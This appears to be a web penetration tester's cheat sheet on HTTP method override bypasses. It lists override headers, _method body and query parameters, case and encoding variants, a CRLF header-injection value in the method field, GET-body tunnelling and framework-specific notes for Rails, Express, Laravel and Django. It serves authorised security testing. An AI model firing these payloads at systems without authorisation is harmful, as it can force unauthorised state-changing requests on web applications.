---
sticker: emoji//1f4d6
---
## HTTP Method Override Bypass Techniques

### Approach

Send every endpoint you find first as GET, then replay with each header below via Intruder — watch for `200` or `500` where you previously got `405`.
### Override Headers

```
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST
_method: POST
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PATCH
```

### Body Parameter Override

```
_method=POST
_method=PUT
_method=DELETE
method=POST
```

### Query String Override

```
?_method=POST
?_method=PUT
?method=POST
?X-HTTP-Method-Override=POST
```

### Case & Encoding Variants

```
x-http-method-override: POST        (lowercase)
X-HTTP-METHOD-OVERRIDE: POST        (uppercase)
X-Http-Method-Override: POST        (mixed)
X-HTTP-Method-Override: post        (lowercase value)
X-HTTP-Method-Override: %50OST      (encoded value)
```

### Method Itself Variants

```
get → GET / Post → POST / pOsT → POST   (case variation on method)
GET\r\nX-Injected: header               (CRLF in method)
GETS                                     (unknown methods, some frameworks default)
ARBITRARY                                (may trigger different code path)
```

### Content-Type Tricks

```
Content-Type: application/x-www-form-urlencoded   + _method=POST in body
Content-Type: application/json                     + "method":"POST" in body
```

### Tunnelling via GET Body

```
GET /endpoint HTTP/1.1
Content-Type: application/json
Content-Length: [n]

{"data":"value"}        ← some frameworks process GET bodies
```

### Combining Techniques

```
# Header + query string simultaneously
GET /endpoint?_method=DELETE HTTP/1.1
X-HTTP-Method-Override: PUT

# Multiple override headers (test which takes precedence)
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
```

### Framework-Specific

```
# Rails
_method=patch (form body)

# Express/Node
X-HTTP-Method-Override (methodOverride middleware)

# Laravel
X-HTTP-Method-Override
_method (form spoofing)

# Django — no native support, but custom middleware common
X-HTTP-Method-Override
```
